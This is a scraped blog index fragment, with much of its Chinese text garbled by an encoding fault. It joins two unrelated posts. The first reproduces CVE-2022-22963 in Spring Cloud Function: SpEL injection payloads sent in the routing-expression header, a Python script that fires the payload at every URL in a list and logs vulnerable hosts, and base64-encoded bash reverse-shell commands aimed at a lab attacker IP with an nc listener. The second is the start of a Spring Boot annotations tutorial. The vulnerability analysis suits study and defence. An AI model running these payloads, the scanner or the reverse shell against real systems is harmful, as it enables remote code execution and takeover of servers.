\u0026lt;spring-cloud-function.version\u0026gt;3.2.1-SNAPSHOT\u0026lt;/spring-cloud-function.version\u0026gt; \u0026lt;wrapper.version\u0026gt;1.0.27.RELEASE\u0026lt;/wrapper.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-function-webflux\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-configuration-processor\u0026lt;/artifactId\u0026gt; \u0026lt;optional\u0026gt;true\u0026lt;/optional\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-function-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud-function.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-deploy-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;skip\u0026gt;true\u0026lt;/skip\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot.experimental\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-thin-layout\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${wrapper.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;artifactId\u0026gt;maven-surefire-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;includes\u0026gt; \u0026lt;include\u0026gt;**/*Tests.java\u0026lt;/include\u0026gt; \u0026lt;include\u0026gt;**/*Test.java\u0026lt;/include\u0026gt; \u0026lt;/includes\u0026gt; \u0026lt;excludes\u0026gt; \u0026lt;exclude\u0026gt;**/Abstract*.java\u0026lt;/exclude\u0026gt; \u0026lt;/excludes\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-snapshots\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshots\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-snapshot-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-milestones\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestones\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-milestone-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;spring-releases\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Releases\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/release\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;pluginRepositories\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-snapshots\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Snapshots\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-snapshot-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-milestones\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Milestones\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-milestone-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;spring-releases\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;Spring Releases\u0026lt;/name\u0026gt; \u0026lt;url\u0026gt;https://repo.spring.io/libs-release-local\u0026lt;/url\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;false\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;/pluginRepositories\u0026gt; \u0026lt;/project\u0026gt; å»ºç«‹ä¸€ä¸ªé…ç½®ç±»ï¼Œç”¨äºå®ç°å­—ç¬¦ä¸²å°å†™\nåœ¨applications.propertiesä¸­å†™å…¥spring.cloud.function.definition:functionRouter\nå¦‚æœè®¾ç½®ä¸ºfunctionRouteråˆ™é»˜è®¤è·¯ç”±ç»‘å®šçš„å…·ä½“å‡½æ•°äº¤ç”±ç”¨æˆ·è¿›è¡Œæ§åˆ¶ï¼Œåœ¨ Spring Cloud Function Webé‡Œé¢ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®httpå¤´çš„æ–¹å¼æ¥æ§åˆ¶ï¼Œä½¿ç”¨spring.cloud.function.definition å’Œspring.cloud.function.routing-expression éƒ½å¯ä»¥ï¼ŒåŒºåˆ«æ˜¯åè€…å…è®¸ä½¿ç”¨Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆSpELï¼‰ã€‚ å¼€å¯8090ç«¯å£\næ¼æ´å¤ç° åœ¨HTTPè¯·æ±‚å¤´åŠ å…¥spring.cloud.function.routing-expression:\npayload:spring.cloud.function.routing-expression: new ProcessBuilder('/System/Applications/Calculator.app/Contents/MacOS/Calculator').start()\nåŒæ—¶ä¹Ÿå¯ä»¥é€šè¿‡T(java.lang.Runtime).getRuntime().exec(\u0026quot;cmd\u0026quot;)æ¥æ‰§è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œ\nä½†æ˜¯è¿™ç§å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾ã€‚ expè„šæœ¬\nexpå®é™…ä¸Šå°±æ˜¯å°è£…å¥½æˆ‘ä»¬æˆ‘ä»¬éœ€è¦å‘é€çš„æ•°æ®åŒ…ï¼Œå¸¦ä¸Šæˆ‘ä»¬çš„æ¶æ„å‚æ•°å¤´ã€‚ å®é™…ä¸Šï¼Œè¿™ä¸ªexpä¹Ÿå¯ä»¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œåªéœ€è¦æ›´æ”¹å‘é€æ•°æ®åŒ…çš„payloadå³å¯ï¼Œä¸‹é¢çš„åå¼¹shellå°±ä¼šç”¨åˆ°è¯¥è„šæœ¬ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import requests import sys import threading import urllib3 urllib3.disable_warnings() def scan(txt,cmd): # payload1=f\u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;{cmd}\u0026#34;)\u0026#39; payload = \u0026#34;new ProcessBuilder(\u0026#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#39;).start()\u0026#34; data =\u0026#39;test\u0026#39; headers = { \u0026#39;spring.cloud.function.routing-expression\u0026#39;:payload, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;en\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; } path = \u0026#39;/functionRouter\u0026#39; f = open(txt) urllist=f.readlines() for url in urllist : url = url.strip(\u0026#39;\\n\u0026#39;) all = url + path try: req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3) code =req.status_code text = req.text rsp = \u0026#39;\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;\u0026#39; if code == 500 and rsp in text: print ( f\u0026#39;[+] { url } is vulnerable\u0026#39; ) poc_file = open(\u0026#39;vulnerable.txt\u0026#39;, \u0026#39;a+\u0026#39;) poc_file.write(url + \u0026#39;\\n\u0026#39;) poc_file.close() else: print ( f\u0026#39;[-] { url } not vulnerable\u0026#39; ) except requests.exceptions.RequestException: print ( f\u0026#39;[-] { url } detection timed out\u0026#39; ) continue except: print ( f\u0026#39;[-] { url } error\u0026#39; ) continue if __name__ == \u0026#39;__main__\u0026#39; : try: cmd1 =sys.argv[1] t = threading . Thread ( target = scan ( cmd1 , \u0026#39;whoami\u0026#39; ) ) t.start() except: print ( \u0026#39;Usage:\u0026#39; ) print(\u0026#39;python poc.py url.txt\u0026#39;) è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬éœ€è¦è¿›è¡Œcveæ‰§è¡Œçš„ipéƒ½å­˜æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹(æ¯”å¦‚ip.txt)é‡Œé¢ æ‰§è¡Œçš„æ—¶å€™è°ƒç”¨python3 exp.py ip.txtå³å¯ åå¼¹shell æˆ‘ä»¬å¯ä»¥é€šè¿‡åå¼¹shellæ‹¿åˆ°ç¨³å®šçš„shell æœ¬åœ°å®ç° è¿™é‡Œæ˜¯é€šè¿‡æœ¬æœºçš„ä¸¤ä¸ªç«¯å£å®ç°ã€‚\nå‘½ä»¤å‡†å¤‡\n1 2 3 4 åå¼¹shellå‘½ä»¤ï¼š bash -i \u0026gt;\u0026amp; /dev/tcp/127.0.0.1/8899 0\u0026gt;\u0026amp;1 base64åŠ å¯†ï¼š bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg5OSAwPiYx}|{base64,-d}|{bash,-i} ä¿®æ”¹æ•°æ®åŒ…åï¼Œå‘é€æ•°æ®åŒ…ï¼š\nåŒæ—¶åœ¨æœ¬æœºç”¨nc -l 8899 ç›‘å¬8899å‘é€æ¥çš„ä¿¡æ¯ã€‚\næ•°æ®åŒ…å‘é€å®Œæ¯•ä¹‹å ç”±æ­¤æ‹¿åˆ°ç¨³å®šçš„shell https://blog.csdn.net/xhwfa/article/details/124307153 ä¸¤ä¸ªè™šæ‹Ÿæœºå®ç° é¶æœºï¼šubuntu 18 : IP:192.168.195.133\næ”»å‡»æœº:kali linux : IP:192.168.195.131\nåœ¨æ”»å‡»æœºå¼€å¯nc -lvvp 8899å¯¹8899ç«¯å£è¿›è¡Œç›‘å¬\nåŒæ—¶æ”»å‡»æœºå¯¹expè„šæœ¬è¿›è¡Œè¿è¡Œ\næ‹¿åˆ°shell\nexpè„šæœ¬ï¼š\nå³ä¸ºå°†ä¸Šé¢çš„é€šç”¨è„šæœ¬é‡Œé¢çš„payloadæ”¹å†™ä¸€ä¸‹å³å¯\n1 payload = \u0026#39;T(java.lang.Runtime).getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjczLjEzMS84ODk5IDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;)\u0026#39; åŸç†åˆ†æ æ ¹æ®æ¼æ´åŸç†åŠå®˜æ–¹æµ‹è¯•ç”¨ä¾‹å¯ä»¥çŸ¥æ™“æ¼æ´è§¦å‘ç‚¹åœ¨http headerä¸­spring.cloud.function.routing-expressionå­—æ®µã€‚\nåœ¨å‘½ä»¤æ‰§è¡Œå‡ºä¸‹æ–­ç‚¹ï¼Œçœ‹ä¸‹ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚\nSpringCloud Functionä¹‹æ‰€ä»¥èƒ½è‡ªåŠ¨å°†å‡½æ•°å»ºç«‹httpç«¯ç‚¹ï¼Œæ˜¯å› ä¸ºåœ¨åŒ…mvc.FunctionControllerä¸­ä½¿ç”¨/** ç›‘å¬äº†get/postç±»å‹çš„æ‰€æœ‰ç«¯ç‚¹ã€‚\n1ã€å½“ä¸€ä¸ªè¯·æ±‚è¿›å…¥æ—¶ï¼Œç¨‹åºé¦–å…ˆåŸºäºSpringbootçš„è‡ªåŠ¨é…ç½®ï¼Œè°ƒç”¨å¤„ç†å™¨ï¼Œéšåå°†ä»¥â€œWebRequestConstants.handlerâ€ä¸ºkeyï¼Œfunctionä¸ºå€¼æ·»åŠ åˆ°requestæ•°ç»„é‡Œé¢ã€‚\n2ã€æ ¹æ®ä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å‘ç°å¯¹æ•°æ®åŒ…å°è£…å¥½ä¹‹åï¼Œæˆ‘ä»¬éƒ½éœ€è¦è°ƒç”¨å‡½æ•°processRequestï¼Œæˆ‘ä»¬ç›´æ¥åœ¨processRequestæ‰“æ–­ç‚¹\nå¯ä»¥å‘ç°wrapperå°è£…çš„å³ä¸ºæˆ‘ä»¬çš„HTTPå¤´ åŒæ—¶æŸ¥çœ‹å‚æ•°function,å‘ç°å…¶functionDefinitionä¸ºfunctionRouter å¦‚æœè®¾ç½®ä¸ºfunctionRouteråˆ™é»˜è®¤è·¯ç”±ç»‘å®šçš„å…·ä½“å‡½æ•°äº¤ç”±ç”¨æˆ·è¿›è¡Œæ§åˆ¶ï¼Œåœ¨ Spring Cloud Function Webé‡Œé¢ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®httpå¤´çš„æ–¹å¼æ¥æ§åˆ¶ï¼Œä½¿ç”¨spring.cloud.function.definition å’Œspring.cloud.function.routing-expression éƒ½å¯ä»¥ï¼ŒåŒºåˆ«æ˜¯åè€…å…è®¸ä½¿ç”¨Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆSpELï¼‰ã€‚ 3ã€é€šè¿‡åˆ¤æ–­åæ‰§è¡Œfunctionçš„applyæ–¹æ³•\nç„¶ååœ¨applyä¸­æ‰§è¡Œdoaplyæ–¹æ³•\n4ã€åˆ¤æ–­æ˜¯ä¸æ˜¯functionRouteræ–¹æ³•ï¼Œåˆ¤æ–­å½“å‰çš„ç±»å‹ï¼Œæ˜¯RouteFunctionæˆ–è€…Composedç›´æ¥è·³è½¬åˆ°elseï¼Œæ‰§è¡Œè‡ªå·±çš„applyæ–¹æ³•ï¼Œè¿™é‡Œæ˜¯functionRouterï¼Œæˆ‘ä»¬ç›´æ¥å°±æ‰§è¡ŒfuntionRouterçš„applyæ–¹æ³•\nå‘ç°åœ¨functionRouterçš„applyæ–¹æ³•ä¸­å®é™…ä¸Šè°ƒç”¨çš„æ˜¯routeæ–¹æ³• 5ã€åˆ†ærouteæ–¹æ³•\nå› ä¸ºfunctionä¸ºnull,ç›´æ¥è¿›å…¥if-else\nå¯ä»¥çœ‹åˆ°ç¨‹åºæ£€æŸ¥headerså‚æ•°ä¸­æ˜¯å¦æœ‰â€œspring.cloud.function.definitionâ€æˆ–è€…â€œspring.cloud.function.routing-expressionâ€œå­—æ®µï¼Œå¹¶è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚å¦‚æœæ˜¯spring.cloud.function.routing-expression ï¼Œåˆ™è°ƒç”¨ functionFromExpression()æ–¹æ³•å¤„ç†ã€‚\n6ã€è·Ÿè¿›åˆ°functionFromExpressionæ–¹æ³•ä¸­ï¼Œå‚æ•°ä¸­routingExpressionï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¯¥å‚æ•°ä¸ºT(java.lang.Runtime).getRuntime().exec(\u0026quot;whoami\u0026quot;)ï¼Œä¹Ÿå°±æ˜¯headerä¸­ä¼ å…¥çš„ã€‚ä¼ å…¥åç”±spelParser.parseExpressionï¼ˆï¼‰å¤„ç†ã€‚\n7ã€æ¼æ´ä¹Ÿå°±æ˜¯åœ¨è¿™é‡ŒSpELè¡¨è¾¾å¼è§£æï¼Œè¿›è¡Œè§¦å‘ã€‚\n","permalink":"http://www.reus09.top/posts/tech/cve-2022-22963/","summary":"æ¼æ´ä»‹ç» Spring Cloud Function æ˜¯åŸºäº Spring Boot çš„å‡½æ•°è®¡ç®—æ¡†æ¶ã€‚è¯¥é¡¹ç›®è‡´åŠ›äºä¿ƒè¿›å‡½æ•°ä¸ºä¸»çš„å¼€å‘å•å…ƒï¼Œå®ƒæŠ½è±¡å‡ºæ‰€æœ‰ä¼ è¾“ç»†èŠ‚å’ŒåŸºç¡€æ¶æ„ï¼Œå¹¶æä¾›ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œç”¨äºåœ¨å„ç§","title":"CVE-2022-22963æ¼æ´å¤ç°"},{"content":" å› ä¸ºä¹‹å‰æ¥è§¦äº†ä¸€ç‚¹ssmï¼Œæ‰€ä»¥è¿™é‡Œç®€å•çš„å­¦ä¹ äº†springbootçš„ä¸€äº›ç®€å•ç”¨æ³•ï¼Œå…·ä½“çš„æºç åˆ†æä»¥åæœ‰æ—¶é—´çš„è¯æ…¢æ…¢åˆ†æ è¿™é‡Œç®€å•è°ˆä¸€ä¸‹springbootçš„ç®€å•äº†è§£ï¼Œspringbootå®é™…ä¸Šæ˜¯æŠŠssmã€webæœåŠ¡å™¨æ¯”å¦‚tomcat,jettyã€mysqlæˆ–è€…nosqlå„ä¸ªæ¡†æ¶æ•´åˆåˆ°ä¸€èµ·çš„äº§ç‰©ï¼Œä½¿ç”¨springbootå®é™…ä¸Šç®€åŒ–äº†å„ä¸ªæ¡†æ¶çš„ç»„åˆä½¿ç”¨ã€‚ springbootä¸­åŠ è½½æ”¯æŒçš„é…ç½®çš„ä¾èµ–ä¸€èˆ¬ä»¥springboot-starter-xxx éå®˜æ–¹æ”¯æŒçš„ç¬¬ä¸‰æ–¹ä¾èµ–å‘½åï¼šxxx-springboot-starter-xxx SpringBooté»˜è®¤ä¼šåœ¨åº•å±‚é…å¥½æ‰€æœ‰çš„ç»„ä»¶ã€‚ä½†æ˜¯å¦‚æœç”¨æˆ·è‡ªå·±é…ç½®äº†ä»¥ç”¨æˆ·çš„ä¼˜å…ˆ å­¦ä¹ å¯ä»¥é€šè¿‡springbootæä¾›çš„å®˜æ–¹æ–‡æ¡£ è¿™é‡Œç»™å‡º2.5.13ç‰ˆæœ¬çš„å®˜æ–¹æ–‡æ¡£é“¾æ¥ https://docs.spring.io/spring-boot/docs/2.5.13/reference/html/ 1 é…ç½®ä½¿ç”¨ application.propertieså’Œapplication.yaml 2 æ³¨è§£ä½¿ç”¨ å› ä¸ºspringbooté›†æˆäº†springmvcå’Œspringï¼Œä¹Ÿç»„åˆäº†å…¶è®¸å¤šçš„æ³¨è§£ @SpringBootApplication 1 2 3 4 5 @SpringBootApplication ç­‰åŒäº @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(\u0026#34;com.reus.boot\u0026#34;) @SpringBootConfiguration @Configurationã€‚ä»£è¡¨å½“å‰æ˜¯ä¸€ä¸ªé…ç½®ç±» @EnableAutoConfiguration 1 2 3 @AutoConfigurationPackage @Import(AutoConfigurationImportSelector.class) public @interface EnableAutoConfiguration {} @EnableAutoConfigurationé›†æˆäº†ä¸¤ä¸ªæ³¨è§£\n@AutoConfigurationPackage\nè‡ªåŠ¨é…ç½®åŒ…,æŒ‡å®šäº†é»˜è®¤çš„åŒ…è§„åˆ™\n1 2 3 4 5 @Import(AutoConfigurationPackages.Registrar.class) //ç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€ä¸ªç»„ä»¶ public @interface AutoConfigurationPackage {} //åˆ©ç”¨Registrarç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€ç³»åˆ—ç»„ä»¶ //å°†æŒ‡å®šçš„ä¸€ä¸ªåŒ…ä¸‹çš„æ‰€æœ‰ç»„ä»¶å¯¼å…¥è¿›æ¥ï¼ŸMainApplication æ‰€åœ¨åŒ…ä¸‹ã€‚ å®é™…ä¸Šå°†æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„åœ¨é»˜è®¤åŒ…ä¸­çš„ç»„ä»¶åŠ å…¥åˆ°å®¹å™¨ä¸­\n@Import(AutoConfigurationImportSelector.class)\n1 2 3 4 5 6 1ã€åˆ©ç”¨getAutoConfigurationEntry(annotationMetadata);ç»™å®¹å™¨ä¸­æ‰¹é‡å¯¼å…¥ä¸€äº›ç»„ä»¶ 2ã€è°ƒç”¨List\u0026lt;String\u0026gt; configurations = getCandidateConfigurations(annotationMetadata, attributes)è·å–åˆ°æ‰€æœ‰éœ€è¦å¯¼å…¥åˆ°å®¹å™¨ä¸­çš„é…ç½®ç±» 3ã€åˆ©ç”¨å·¥å‚åŠ è½½ Map\u0026lt;String, List\u0026lt;String\u0026gt;\u0026gt; loadSpringFactories(@Nullable ClassLoader classLoader)ï¼›å¾—åˆ°æ‰€æœ‰çš„ç»„ä»¶ 4ã€ä»META-INF/spring.factoriesä½ç½®æ¥åŠ è½½ä¸€ä¸ªæ–‡ä»¶ã€‚ é»˜è®¤æ‰«ææˆ‘ä»¬å½“å‰ç³»ç»Ÿé‡Œé¢æ‰€æœ‰META-INF/spring.factoriesä½ç½®çš„æ–‡ä»¶ spring-boot-autoconfigure-2.3.4.RELEASE.jaråŒ…é‡Œé¢ä¹Ÿæœ‰META-INF/spring.factories è¿™é‡Œæ˜¯åŠ è½½springbootç»™æˆ‘ä»¬æä¾›çš„è¯¥é¡¹ç›®éœ€è¦ç»‘å®šçš„é»˜è®¤ç»„ä»¶ã€‚ @ComponentScan(\u0026quot;com.reus.boot\u0026quot;) æŒ‡å®šæ‰«æå“ªäº›ï¼ŒSpringæ³¨è§£ï¼›æŒ‡å®šæ‰«æé‚£äº›åŒ… @Configuration å‘Šè¯‰å®¹å™¨è¿™æ˜¯ä¸€ä¸ªé…ç½®ç±»\nåŸºæœ¬ä½¿ç”¨ Fullæ¨¡å¼ä¸Liteæ¨¡å¼ ç¤ºä¾‹ æœ€ä½³å®æˆ˜ é…ç½® ç±»ç»„ä»¶ä¹‹é—´æ— ä¾èµ–å…³ç³»ç”¨Liteæ¨¡å¼åŠ é€Ÿå®¹å™¨å¯åŠ¨è¿‡ç¨‹ï¼Œå‡å°‘åˆ¤æ–­ é…ç½®ç±»ç»„ä»¶ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œæ–¹æ³•ä¼šè¢«è°ƒç”¨å¾—åˆ°ä¹‹å‰å•å®ä¾‹ç»„ä»¶ï¼Œç”¨Fullæ¨¡å¼ é…ç½®ç±»é‡Œé¢ä½¿ç”¨@Beanæ ‡æ³¨åœ¨æ–¹æ³•ä¸Šç»™å®¹å™¨æ³¨å†Œç»„ä»¶ï¼Œé»˜è®¤ä¹Ÿæ˜¯å•å®ä¾‹çš„ é…ç½®ç±»æœ¬èº«ä¹Ÿæ˜¯ç»„ä»¶ proxyBeanMethodsï¼šä»£ç†beançš„æ–¹æ³• Full(proxyBeanMethods = true)ã€ã€ä¿è¯æ¯ä¸ª@Beanæ–¹æ³•è¢«è°ƒç”¨å¤šå°‘æ¬¡è¿”å›çš„ç»„ä»¶éƒ½æ˜¯å•å®ä¾‹çš„ã€‘ Lite(proxyBeanMethods = false)ã€æ¯ä¸ª@Beanæ–¹æ³•è¢«è°ƒç”¨å¤šå°‘æ¬¡è¿”å›çš„ç»„ä»¶éƒ½æ˜¯æ–°åˆ›å»ºçš„ã€‘ ç»„ä»¶ä¾èµ–å¿…é¡»ä½¿ç”¨Fullæ¨¡å¼é»˜è®¤ã€‚å…¶ä»–é»˜è®¤æ˜¯å¦Liteæ¨¡å¼ @Conditional æ¡ä»¶è£…é…ï¼šæ»¡è¶³ConditionalæŒ‡å®šçš„æ¡ä»¶ï¼Œåˆ™è¿›è¡Œç»„ä»¶æ³¨å…¥ ä½œç”¨åœ¨ç»„ä»¶ä¸Šï¼Œå¦‚æœæ»¡è¶³æ³¨è§£çš„contionalæ¡ä»¶å°±ç”Ÿæ•ˆï¼Œå¦åˆ™å°±ä¸ç”Ÿæ•ˆ @ConfigurationProperties æ³•ä¸€ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * åªæœ‰åœ¨å®¹å™¨ä¸­çš„ç»„ä»¶ï¼Œæ‰ä¼šæ‹¥æœ‰SpringBootæä¾›çš„å¼ºå¤§åŠŸèƒ½ */ @Component @ConfigurationProperties(prefix = \u0026#34;person\u0026#34;) public class Person { private String userName; private Boolean boss; private Date birth; private Integer age; private Pet pet; private String[] interests; private List\u0026lt;String\u0026gt; animal; private Map\u0026lt;String, Object\u0026gt; score; private Set\u0026lt;Double\u0026gt; salarys; private Map\u0026lt;String, List\u0026lt;Pet\u0026gt;\u0026gt; allPets; } æ³•äºŒ\nä¸æ ‡æ³¨@Componentå³ä¸éœ€è¦è®²Personç±»åŠ è½½åˆ°ç»„ä»¶ä¸­\nè¿™æ ·åœ¨éœ€è¦ç»‘å®šçš„æ—¶å€™ï¼Œæ ‡æ³¨æ³¨è§£\n1 2 3 4 5 @EnableConfigurationProperties(Person.class) //1ã€å¼€å¯Personé…ç½®ç»‘å®šåŠŸèƒ½ //2ã€æŠŠè¿™ä¸ªPersonè¿™ä¸ªç»„ä»¶è‡ªåŠ¨æ³¨å†Œåˆ°å®¹å™¨ä¸­ public class MyConfig { } è¿™ä¸ªç»„ä»¶çš„èµ‹å€¼æ˜¯åœ¨é…ç½®æ–‡ä»¶application.propertiesæˆ–application.xmlé‡Œé¢æ‰¾åˆ°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 person: birth: 2001/11/1 age: 18 # interests: [ç¯®çƒ,è¶³çƒ] interests: - ç¯®çƒ - è¶³çƒ animal: [é˜¿æ¯›ï¼Œé˜¿ç‹—] score: {english:80,shuxue:90} salarys: - 9999.98 - 9999.91 pet: name: cat weight: 99.2 allPets: sick: - {name: é˜¿ç‹—,weight: 99.99} - name: é˜¿çŒ« weight: 88 - name: é˜¿ä¸¢ weight: 22 health: - {name: é˜¿èŠ±,weight:199.22} - {name: é˜¿æ°´,weight:122.22} user-name: zhangsan boss: true @RestController 1 2 3 4 5 6 7 8 9 10 11 @Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Controller @ResponseBody public @interface RestController { @AliasFor( annotation = Controller.class ) String value() default \u0026#34;\u0026#34;; } å®é™…é›†æˆäº†Controllerå’ŒResponseBody æ ‡æ³¨äº†è¯¥ç±»æ˜¯ä¸€ä¸ªç»„ä»¶ï¼Œå¹¶ä¸”è¡¨æ˜çš„ç»“æœä¸ºå­—ç¬¦ä¸²ç›´æ¥è¿”å›åˆ°æµè§ˆå™¨ã€‚ æ™®é€šå‚æ•°æ³¨è§£ @PathVariableã€@RequestHeaderã€@ModelAttributeã€@RequestParamã€@MatrixVariableã€@CookieValueã€@RequestBody\nè¿™äº›æ³¨è§£åœ¨springmvcä¸­å·²ç»äº†è§£è¿‡ï¼Œå°±ä¸åœ¨èµ˜è¿°\n1 2 3 4 5 6 7 8 9 10 11 12 // car/2/owner/zhangsan @GetMapping(\u0026#34;/car/{id}/owner/{username}\u0026#34;) public Map\u0026lt;String,Object\u0026gt; getCar(@PathVariable(\u0026#34;id\u0026#34;) Integer id, @PathVariable(\u0026#34;username\u0026#34;) String name, @PathVariable Map\u0026lt;String,String\u0026gt; pv, 